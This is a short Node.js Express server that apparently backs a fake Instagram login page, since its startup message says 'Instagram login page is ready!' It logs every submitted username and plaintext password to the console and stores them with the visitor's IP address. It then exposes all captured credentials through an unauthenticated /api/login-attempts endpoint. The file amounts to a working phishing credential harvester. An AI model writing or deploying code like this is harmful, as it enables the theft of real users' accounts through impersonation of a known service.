const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Store login attempts (in production, use a database)
const loginAttempts = [];

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login POST request
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    // Log the login details to console (backend receives the data)
    console.log('Login attempt received:');
    console.log('Username:', username);
    console.log('Password:', password);
    console.log('Timestamp:', new Date().toISOString());
    console.log('-------------------');
    
    // Store the login attempt
    const loginData = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        ipAddress: req.ip || req.connection.remoteAddress
    };
    
    loginAttempts.push(loginData);
    
    // Send response
    res.json({
        success: true,
        message: 'Login details received',
        data: {
            username: username,
            timestamp: loginData.timestamp
        }
    });
});

// Get all login attempts (for viewing backend data)
app.get('/api/login-attempts', (req, res) => {
    res.json({
        success: true,
        count: loginAttempts.length,
        attempts: loginAttempts
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log('Instagram login page is ready!');
});
